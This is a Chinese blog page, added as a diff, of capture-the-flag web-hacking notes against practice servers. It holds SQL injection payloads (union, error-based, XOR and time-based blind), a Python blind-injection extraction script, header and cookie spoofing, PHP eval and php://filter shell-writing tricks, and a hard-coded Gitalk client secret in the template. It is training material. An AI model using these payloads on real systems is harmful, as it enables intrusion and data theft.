@@ -1,0 +1,717 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>简记web常见思路一</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《简记web常见思路一》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		3/21/2019 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2019/03/21/简记web常见思路一/" itemprop="url">		
+			简记web常见思路一		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2019/03/21/简记web常见思路一/" itemprop="url">
+	<time datetime="2019-03-21T02:08:10.509Z" itemprop="datePublished">
+  		2019-03-21
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>1、看源代码</p>
+<p>2、F5审查元素</p>
+<p>3、抓包看回显，需要注意的头部的信息。</p>
+<p>4、扫目录</p>
+<p>5、找泄漏（.git/svn/robots.txt…..）</p>
+<p>6、找cms/框架特征-&gt;现有的cve/乌云</p>
+<p>7、各种漏洞（sql，xss，csrf，upfile…..）</p>
+<h3 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h3><p><code>\&amp;#75;\&amp;#69;\&amp;#89;</code>-&gt;<code>unincode</code>编码</p>
+<p><code>[][(![]+[])[+[]]</code>-&gt; js解码(<code>F12-&gt;console</code>)</p>
+<p><code>JavaScript unescape()</code>函数可对通过<code>escape()</code>编码的字符串进行解码。传参为string。</p>
+<p>例如：<a href="http://123.206.87.240:8002/web4/" target="_blank" rel="noopener">http://123.206.87.240:8002/web4/</a>。<br>    <script><br>    var p1 = ‘%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%<br>    29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62’;<br>    var p2 = ‘%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b’;<br>    eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));<br>    </script>`</p>
+<p>但是用途不止这个，对于XSS题目有用</p>
+<h3 id="host解析"><a href="#host解析" class="headerlink" title="host解析"></a>host解析</h3><p>win中<code>c:\windows\system32\drivers\etc\hosts</code>添加<code>ip domian</code></p>
+<p>linux中<code>/etc/hosts</code>添加<code>ip+domian</code></p>
+<p>也可以抓包改host(ip)-&gt;host(domian)</p>
+<p><img src="https://i.imgur.com/DfRCnrb.png" alt=""></p>
+<h3 id="细心观察"><a href="#细心观察" class="headerlink" title="细心观察"></a>细心观察</h3><p>没有思路时，连续发包看回显</p>
+<p>例如:<a href="http://123.206.87.240:8002/web12/" target="_blank" rel="noopener">http://123.206.87.240:8002/web12/</a></p>
+<p>每次发包回显有一定可能有变化</p>
+<p>技巧：n次<code>repeater == intruder</code></p>
+<p><img src="https://i.imgur.com/lj54hKR.png" alt=""></p>
+<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>场景：存在<code>assert/eval....</code>，并且参数可控<br>例如：</p>
+<pre><code>&lt;?php
+
+include &quot;flag.php&quot;; 
+
+$a = @$_REQUEST[&#39;hello&#39;];
+
+eval( &quot;var_dump($a);&quot;); 
+
+show_source(__FILE__); 
+
+?&gt;
+</code></pre><p>payload: <code>?hello=1);show_source(&quot;flag.php&quot;</code> =&gt;参看到flag.php源码</p>
+<h3 id="可变变量与-GLOBALS"><a href="#可变变量与-GLOBALS" class="headerlink" title="可变变量与$GLOBALS"></a>可变变量与$GLOBALS</h3><p>可变变量类似于<code>$a=&#39;b&#39;;$b=&#39;c&#39;;echo $$a; =&gt; c</code></p>
+<p>$_GLOBALS超全局数组中存储着全局的变量</p>
+<p>例如：<a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php</a></p>
+<h3 id="关于header的题目"><a href="#关于header的题目" class="headerlink" title="关于header的题目"></a>关于header的题目</h3><h4 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h4><p><strong>IP限制</strong></p>
+<pre><code>X-FORWARDED-FOR: 127.0.0.1（http://123.206.31.85:1003/）
+对于绕过IP还有很多
+    Client-Ip: 127.0.0.1
+    X-Forwarded-For: 127.0.0.1
+    HTTP_CLIENT_IP: 127.0.0.1
+    REMOTE_ADDR: 127.0.0.1
+    Host: 127.0.0.1
+    Referer: www.google.com（这个是说只能接受从某页面过来的）
+一般流程代码：
+&lt;?php
+    function GetIP(){
+        if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))
+            $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];
+        else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))
+            $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];
+        else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))
+            $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];
+        else
+            $cip = &quot;0.0.0.0&quot;;
+        return $cip;
+        }
+    $GetIPs = GetIP();
+    if ($GetIPs==&quot;1.1.1.1&quot;){
+        echo &quot;Great! Key is *********&quot;;
+    }
+    else{
+        echo &quot;错误！你的IP不在访问列表之内！&quot;;
+    }
+?&gt;
+</code></pre><p><strong>使用固定浏览器访问</strong></p>
+<pre><code>修改User-agent
+    简单修改：http://119.23.73.3:5001/web3/，直接修改user-agent: NAIVE
+
+    难度修改：http://202.38.95.46:12001/，从view-source:https://
+
+    heicore.com/index.html拿到Mozilla/5.0 (Windows NT 6.1; WOW64) 
+
+    AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36
+</code></pre><p><strong>突破地域限制</strong></p>
+<pre><code>修改accept-language，比如http://119.23.73.3:5001/web3/，修改为zh-HK，从香港访问
+</code></pre><p><strong>COOKIE欺骗</strong></p>
+<pre><code>COOKIE值进行修改，达到欺骗目的
+比如：
+http://123.206.87.240:8002/web11/index.php?line=18&amp;filename=aW5kZXgucGhw
+Cookie: margin=margin
+?line=0&amp;filename=a2V5cy5waHA
+line是读取的行数（0行=&gt;1行）
+filename为需要读的文件的base64编码
+身份验证
+权限问题，cookie值的更改可以导致越权
+比如：
+http://119.23.73.3:5001/web9/
+</code></pre><h4 id="reponse"><a href="#reponse" class="headerlink" title="reponse"></a>reponse</h4><p><strong>仔细观察头部信息</strong></p>
+<pre><code>参数返回值（Cookies）
+头部其它隐蔽地方直接隐藏（http://123.206.87.240:9009/hd.php）
+302重定向
+    奇特地重定向：http://119.23.73.3:5006/web2/ =&gt; 119.23.73.3:5006/web2/index2.php
+    访问119.23.73.3:5006/web2/ =&gt; 119.23.73.3:5006/web2/index2.php
+</code></pre><h3 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h3><p><strong>1.php://filter/（php伪协议）</strong></p>
+<pre><code>php://filter/read=convert.base64-encode/resource=xxx.php
+http://123.206.87.240:8005/post/index.php?file=show.php
+之所以会有文件包含漏洞，是因为没有过滤，直接把file值带入include()内进行执行，
+例如：http://119.23.73.3:5101/
+这有一道php://filter/写入流的应用
+http://119.23.73.3:5003/
+使用php://filter/write=convert.base64-decode/resource=xxx.php，像xxx.php中写入内容，通过写入base64解码后的数据流实现，配合file_put_contents()使用进行写shell。
+其中涉及到两个知识点：
+base64解码表A-Z、a-z、0-9、+、/，其它的内容base64解码会将其过滤掉，比如&lt;?;&gt;与空格，就会自动过滤掉，题目中的&lt;?php exit;&gt;=&gt;phpexit
+base64算法解码时是4个byte一组，所以该题目如果phpexit正常解码，不影响后面的一句话，就必须构造8个字符。
+</code></pre><h3 id="暴力破解-gt-bp-intruder"><a href="#暴力破解-gt-bp-intruder" class="headerlink" title="暴力破解-&gt;bp-intruder"></a>暴力破解-&gt;bp-intruder</h3><pre><code>http://123.206.87.240:8002/baopo/
+</code></pre><p>辅助脚本</p>
+<pre><code> a = &quot;1234567890&quot;
+ f = open(&quot;num_5.txt&quot;,&#39;wb&#39;)
+for a1 in a:
+    for a2 in a:
+            for a3 in a:
+                    for a4 in a:
+                            for a5 in a:
+                                    f.write(a1+a2+a3+a4+a5+&#39;\n&#39;)
+f.close()
+</code></pre><p>动画，游戏，事件（点击…),查看前端代码，一般考点在为js代码</p>
+<p><a href="http://123.206.87.240:9001/test/" target="_blank" rel="noopener">http://123.206.87.240:9001/test/</a></p>
+<p>参看源码，关注点：标签的<code>name + javascript</code>代码</p>
+<p>此时就是阅读理解js代码逻辑，此题只需要<code>post</code>提交clicks=1000000即可</p>
+<p><a href="http://114.55.36.69:8011/" target="_blank" rel="noopener">http://114.55.36.69:8011/</a></p>
+<p>可以直接执行颜文字，也可以修改js代码看逻辑（index主页是不可修改的）</p>
+<p><a href="http://119.23.73.3:5001/web2/" target="_blank" rel="noopener">http://119.23.73.3:5001/web2/</a></p>
+<p>js前端设置，不可输入与文本长度限制</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>希望看到的注入（非万能密码登录）的顺序</p>
+<p>有回显的注入 =&gt; 报错注入 =&gt; 盲注（boole-&gt;time）</p>
+<h4 id="sql注入之注释"><a href="#sql注入之注释" class="headerlink" title="sql注入之注释"></a>sql注入之注释</h4><p>或许在某些时候不能用,但是%23却是可以的</p>
+<p>当然–=也是可以，不过–(空格)却有时会出错，幸好还有<code>--%20</code></p>
+<h4 id="简单的回显注入"><a href="#简单的回显注入" class="headerlink" title="简单的回显注入"></a>简单的回显注入</h4><p>例如：<a href="http://123.206.87.240:8002/chengjidan/index.php" target="_blank" rel="noopener">http://123.206.87.240:8002/chengjidan/index.php</a></p>
+<pre><code>0&#39; union select (select group_concat(column_name) from information_schema.columns where table_schema=database()),(select group_concat(table_name) from information_schema.tables where table_schema=database()),skctf_flag,4 from fl4g#
+</code></pre><p>例如：<a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></p>
+<pre><code>admin_name：admin&quot; union select 1,2#
+</code></pre><h4 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h4><pre><code>count(*)floor(rand(0)*2)group by
+</code></pre><p>例如：</p>
+<p><a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1
+payload：admin_name：admin&quot; union select count(*),concat(0x3a,(select user()),(floor(rand(0)*2)))a from information_schema.tables group by a#
+</code></pre><p>from 后面一定要跟表名，不然会报错</p>
+<p>EXTRACTVALUE()//payload:<code>admin&quot;and extractvalue(0x3a,concat(0x3a,(select database())))#</code></p>
+<p>updataxml() //payload:<code>admin&quot; and (updatexml(0x3a,concat(0x3a,(select database())),0x3a))#</code></p>
+<p>以上两个都可以作为报错语句使用，注意语法的使用</p>
+<h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p><code>admin&#39; or 1=1#</code> / <code>admin&#39; or &#39;1&#39;=&#39;1</code></p>
+<p><a href="http://119.23.73.3:5002/index.php" target="_blank" rel="noopener">http://119.23.73.3:5002/index.php</a></p>
+<p>如果不能使用<code>or,and,union</code>，甚至不能使用数字</p>
+<p>payload: <code>a&#39;=&#39;</code> =&gt; 存在的=不存在的为false，false=’’为true</p>
+<p><strong>MD5哈希校验的登录页面</strong></p>
+<p>payload: <code>a&#39; union select 1,md5(1)--+</code> =&gt; 密码为1，这里表的列数应该要正确</p>
+<p>后端代码：</p>
+<pre><code>$pass = md5($_GET[&#39;pass&#39;]);
+$sql = &quot;select password from users where username=&#39;$user&#39;&quot;;
+$query = mysql_query($sql);
+$row = mysql_fetch_array($query, MYSQL_ASSOC);
+if(($row[password])&amp;&amp;(!strcasecmp($pass,$row[password]))){
+echo &#39;login success&#39;;
+.......
+}
+
+
+mysql&gt; select *  from tests where username=&#39;a&#39; union select 1,md5(1);
+</code></pre><p>+———-+———————————-+<br>| username | password                         |<br>+———-+———————————-+<br>| 1        | c4ca4238a0b923820dcc509a6f75849b |<br>+———-+———————————-+</p>
+<p>例如：<a href="http://123.206.31.85:49165/login.php" target="_blank" rel="noopener">http://123.206.31.85:49165/login.php</a></p>
+<h4 id="盲注之异或注入"><a href="#盲注之异或注入" class="headerlink" title="盲注之异或注入"></a>盲注之异或注入</h4><p>因为过滤了空格，/<em>\</em>/等，所以引号不好闭合，此时异或也是一种解决办法</p>
+<p>例如:<a href="http://119.23.73.3:5004/" target="_blank" rel="noopener">http://119.23.73.3:5004/</a></p>
+<p>paylod：<code>id=2&#39;^(select(1))^&#39;0</code></p>
+<p>成功注入</p>
+<p>绕后就是盲注了，mid(),assci(),limit()，使用括号来绕过()</p>
+<p><strong>tip:</strong></p>
+<p>1、使用工具</p>
+<pre><code>burpsuit-&gt;intruder-&gt;clubster bomb-&gt;attack即可
+</code></pre><p>爆表：</p>
+<pre><code>GET /?id=2%27^(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),§1§,1)=&#39;§1§&#39;)^%271 HTTP/1.1
+</code></pre><p>爆列：</p>
+<pre><code>GET /?id=2%27^(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),§1§,1)=&#39;§1§&#39;)^%271 HTTP/1.1
+</code></pre><p>爆flag<br>    GET /?id=2%27^(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),§1§,1)=’§1§’)^%271</p>
+<p>2、脚本就不说了，详细见: <a href="http://bey0nd.club/2018/11/02/1/" target="_blank" rel="noopener">http://bey0nd.club/2018/11/02/1/</a></p>
+<p>2、mid，substr函数不区分大小写</p>
+<h4 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h4><p>1、在select where查询语句中，会西东忽略空格</p>
+<p>mysql&gt; select * from tests where usename=’ad’;<br>+———+———-+<br>| usename | password |<br>+———+———-+<br>| ad      | sf       |<br>+———+———-+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; select * from tests where usename=’ad  ‘;<br>+———+———-+<br>| usename | password |<br>+———+———-+<br>| ad      | sf       |<br>+———+———-+<br>1 row in set (0.00 sec)</p>
+<p>2、在宽松模式下，即@@sql_mode=ANSI时，插入数据(insert)如果不符合定义类型或长度，对数据类型调整或截断保存并警告。<br>需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。</p>
+<p>3、所以攻击流程</p>
+<pre><code>insert into table(column1,column2) values (&#39;admin         1&#39;,&#39;password&#39;) //假设管理员为admin，插入admin+若干空格+1
+select * from table where column1=&#39;admin&#39; //即可出现刚才插入的那一条
+</code></pre><p>例如：<a href="http://123.206.31.85:49163/index.php" target="_blank" rel="noopener">http://123.206.31.85:49163/index.php</a></p>
+<h4 id="insert-into-基于时间的盲注"><a href="#insert-into-基于时间的盲注" class="headerlink" title="insert into 基于时间的盲注"></a>insert into 基于时间的盲注</h4><p>例如：</p>
+<pre><code>$sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;
+payload_1: insert into client_ip (ip) values (&#39;$ip&#39; and (case when() then sleep() else 1 end))
+payload_2: insert into client_ip (ip) values (&#39;$ip&#39;+(select case when() then sleep() else 1 end)+&#39;&#39;)`
+</code></pre><p>例如：<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a></p>
+<pre><code>payload：X-FORWARDED-FOR: 1&#39; and (case when (1=1) then sleep(3) else 1 end))#
+</code></pre><p><strong>exp.py</strong></p>
+<pre><code>import requests
+url = &quot;http://123.206.87.240:8002/web15/&quot;
+flag = &#39;&#39;
+
+payload = &quot;1&#39; and (case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1))={1}) then sleep(5) else 1 end))#&quot;
+
+payload = &quot;1&#39; and (case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()) from {0} for 1))={1}) then sleep(5) else 1 end))#&quot;
+
+payload = &quot;1&#39; and (case when (ascii(substr((select group_concat(flag) from flag) from {0} for 1))={1}) then sleep(5) else 1 end))#&quot;
+
+for i in range(1, 40):
+for j in range(33, 127):
+    headers = {&quot;x-forwarded-for&quot;: payload.format(str(i), str(j))}
+    # print headers
+    try:
+        result = requests.get(url, headers=headers, timeout=3)
+    except requests.exceptions.ReadTimeout, e:
+        flag += chr(j)
+        print flag
+        break
+</code></pre><p>注意在写payload之前记得测试过滤函数与字符，intrude一下或者直接手动尝试payload。</p>
+<h4 id="注入之bypass"><a href="#注入之bypass" class="headerlink" title="注入之bypass"></a>注入之bypass</h4><p><strong>fuzz过滤内容的方式</strong></p>
+<p>方法：</p>
+<p>可以使用异或(^) =&gt; 前提是删除过滤，需要构造正确的sql语句才可以判断，length()没有被过滤</p>
+<p>例如：<br>     <a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a><br>    fuzz_payload: ?id=5’^(length(‘$value’)=0)–+<br>    =&gt;injection_payload1: -1’ uniunionon selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()–+</p>
+<p>跳转后的新payload：</p>
+<pre><code>injection_payload2: 1&#39; and extractvalue(0x3a,concat(0x3a,(select flag2 from flag2)))--+
+</code></pre><p>或者</p>
+<pre><code>injection_payload3:1&#39; and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=ascii(&#39;a&#39;)%23
+</code></pre><p>跟在参数后面fuzz</p>
+<p>在盲注的时候，如果<code>and，or，||，&amp;&amp;</code>被过滤，可以使用^符号代替，比如：<a href="http://123.206.87.240:8007/web2/" target="_blank" rel="noopener">http://123.206.87.240:8007/web2/</a></p>
+<p>payload: <code>uname=admin&#39;^($sql)^&#39;1 =&gt;$sql</code>为true与false的回显不同，这里有个点，类似于php弱类型的’==’的用法，在盲注的时候，</p>
+<p>如果and，or，||，&amp;&amp;被过滤，可以使用’-‘或者’+’符号代替</p>
+<p>payload: <code>uname=admin&#39;-&#39;0 =&gt; 0</code>处使用注入语句代替，true与false的回显不同</p>
+<p>payload: <code>uname=admin&#39;-0- &#39; =&gt;</code> 与上面一样，单引号为了闭合</p>
+<p>如果盲注的时候，在1与2的基础上又有空格与逗号被过滤，使用函数与()绕过</p>
+<p>例如：<a href="http://123.206.87.240:8007/web2/" target="_blank" rel="noopener">http://123.206.87.240:8007/web2/</a></p>
+<p>payload: <code>admin&#39;-(mid(reverse(mid((passwd)from(1)))from(-1))=&#39;0&#39;)-&#39;-1 =&gt;mid(reverse(mid(&#39;abc&#39;from(3)))from(-1)) &lt;=&gt; mid(&#39;abc&#39;,3,1)</code></p>
+<p>或者</p>
+<p>payload: <code>admin&#39;-(mid((passwd)from(1))&lt;&gt;&#39;0&#39;)-&#39;-1</code></p>
+<p>对于这个可以说是，等号(=)被过滤，使用不等号&lt;&gt;，这里控制截取字符串使用倒序，1 =&gt; [n,n-1,n-2…..1]，比较采用比较字符串的式，</p>
+<p><code>&#39;0&#39; =&gt; [a,ba,cba....]</code>，当然也可以使用reverse函数。</p>
+<p>例如：<a href="http://123.206.31.85:49167/index.php" target="_blank" rel="noopener">http://123.206.31.85:49167/index.php</a></p>
+<h3 id="源码泄漏"><a href="#源码泄漏" class="headerlink" title="源码泄漏"></a>源码泄漏</h3><pre><code>.bak
+</code></pre><p><a href="http://123.206.87.240:8002/web16/" target="_blank" rel="noopener">http://123.206.87.240:8002/web16/</a></p>
+<pre><code>index.php.bak
+</code></pre><p>然后代码审计</p>
+<pre><code>str_replace(&#39;key&#39;,&#39;&#39;,$str); //%str中把key替换为空
+parse_str($str) //把查询字符串解析到变量中，该题目中相当于$_GET[&#39;key1&#39;]赋值
+然后就是php黑魔法中的0e黑科技
+
+.php~ ：php常见的一个源码泄漏
+</code></pre><p>例如：<a href="http://119.23.73.3:5001/web5/" target="_blank" rel="noopener">http://119.23.73.3:5001/web5/</a></p>
+<pre><code>.swp：文件异常退出时系统自动的备份文件，可以恢复源文件的。使用vim -r xx.xx.swp即可查看到原始的内容
+</code></pre><p>例如：<a href="http://123.206.31.85:49168/index.php" target="_blank" rel="noopener">http://123.206.31.85:49168/index.php</a></p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+    	<li class="am-pagination-prev">
+   		<a class="pull-left" href="/2019/03/21/江阴八十一日/" title="江阴八十一日">
+      		&laquo; 上一篇
+		</a>
+		</li>
+	
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2019/03/21/记一份感想——落花随笔(一)/" title="记一份感想——落花随笔(一)">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+
+  <div id="gitalk-container"></div>
+
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//create gitalk
+	var gitalk = new Gitalk({
+		clientID: '74a83cc9b15a1cf53e10',
+		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
+		//id: window.location.pathname,
+		// id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
+		repo: 'Annie-Gitalk',
+		owner: 'miraitowa',
+		admin: 'miraitowa',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#编码与解码"><span class="post-toc-text">编码与解码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#host解析"><span class="post-toc-text">host解析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#细心观察"><span class="post-toc-text">细心观察</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#代码执行"><span class="post-toc-text">代码执行</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#可变变量与-GLOBALS"><span class="post-toc-text">可变变量与$GLOBALS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#关于header的题目"><span class="post-toc-text">关于header的题目</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#requests"><span class="post-toc-text">requests</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#reponse"><span 